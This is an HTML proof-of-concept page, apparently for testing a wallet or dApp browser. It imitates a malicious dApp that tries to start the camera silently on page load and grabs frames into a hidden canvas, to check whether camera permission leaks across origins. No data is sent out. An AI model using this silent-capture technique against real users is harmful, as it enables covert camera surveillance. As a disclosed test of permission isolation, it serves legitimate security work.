<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POC Evil dApp - Silent Camera Sniffer</title>
  <style>
    :root {
      color-scheme: light;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: radial-gradient(circle at top right, #ffd9d9 0%, #fff 55%);
      color: #281a1a;
    }

    .container {
      box-sizing: border-box;
      max-width: 760px;
      margin: 0 auto;
      padding: 24px 16px 40px;
    }

    h1 {
      margin: 0;
      font-size: 26px;
      line-height: 1.25;
      color: #751818;
    }

    p {
      line-height: 1.5;
      color: #5c2e2e;
    }

    .card {
      background: #fff;
      border: 1px solid #ffd0d0;
      border-radius: 14px;
      padding: 16px;
      box-shadow: 0 8px 24px rgba(163, 26, 26, 0.12);
    }

    .status {
      margin-top: 10px;
      font-weight: 700;
      word-break: break-word;
    }

    .ok { color: #0c6b2f; }
    .warn { color: #a33232; }

    .actions {
      display: flex;
      gap: 12px;
      margin-top: 10px;
      flex-wrap: wrap;
    }

    button {
      border: none;
      border-radius: 10px;
      padding: 12px 16px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    #retry {
      background: #a32121;
      color: #fff;
    }

    #stop {
      background: #ffe3e3;
      color: #5a1e1e;
    }

    .origin {
      margin-top: 8px;
      font-size: 12px;
      color: #805151;
      word-break: break-all;
    }

    video {
      width: 100%;
      margin-top: 12px;
      border-radius: 12px;
      border: 1px solid #f2bcbc;
      background: #0d1119;
      min-height: 220px;
      object-fit: cover;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <main class="container">
    <h1>[POC] Silent Camera Sniffer</h1>
    <p>
      This page imitates a malicious dApp. It attempts to start camera stream on page load without explicit user interaction.
      If stream starts here after camera was granted to another origin, permission isolation is broken.
    </p>

    <section class="card">
      <div id="status" class="status warn">Initializing...</div>
      <div class="origin" id="origin"></div>
      <div class="actions">
        <button id="retry" type="button">Retry Silent Start</button>
        <button id="stop" type="button">Stop Stream</button>
      </div>
      <video id="preview" autoplay playsinline muted></video>
      <canvas id="grabber" width="320" height="240"></canvas>
      <p id="frames">Captured frames: 0</p>
    </section>
  </main>

  <script>
    const statusElement = document.getElementById('status');
    const framesElement = document.getElementById('frames');
    const originElement = document.getElementById('origin');
    const preview = document.getElementById('preview');
    const grabber = document.getElementById('grabber');
    const context = grabber.getContext('2d');
    const retryButton = document.getElementById('retry');
    const stopButton = document.getElementById('stop');

    let stream;
    let captureTimer;
    let capturedFrames = 0;

    originElement.textContent = `Origin: ${window.location.origin}`;

    function setStatus(message, ok = false) {
      statusElement.textContent = message;
      statusElement.className = `status ${ok ? 'ok' : 'warn'}`;
    }

    function stopStream() {
      if (captureTimer) {
        clearInterval(captureTimer);
        captureTimer = undefined;
      }
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
      preview.srcObject = null;
      stream = undefined;
      setStatus('Stream stopped', false);
    }

    async function trySilentCameraStart() {
      stopStream();
      capturedFrames = 0;
      framesElement.textContent = 'Captured frames: 0';
      setStatus('Attempting silent camera start...', false);

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        preview.srcObject = stream;
        setStatus('Camera stream started without explicit in-page action', true);

        captureTimer = setInterval(() => {
          if (!stream || !preview.videoWidth || !preview.videoHeight) return;
          context.drawImage(preview, 0, 0, grabber.width, grabber.height);
          capturedFrames += 1;
          framesElement.textContent = `Captured frames: ${capturedFrames}`;
        }, 750);
      } catch (error) {
        setStatus(`Camera blocked: ${error.name}`, false);
      }
    }

    retryButton.addEventListener('click', trySilentCameraStart);
    stopButton.addEventListener('click', stopStream);
    window.addEventListener('pagehide', stopStream);

    void trySilentCameraStart();
  </script>
</body>
</html>
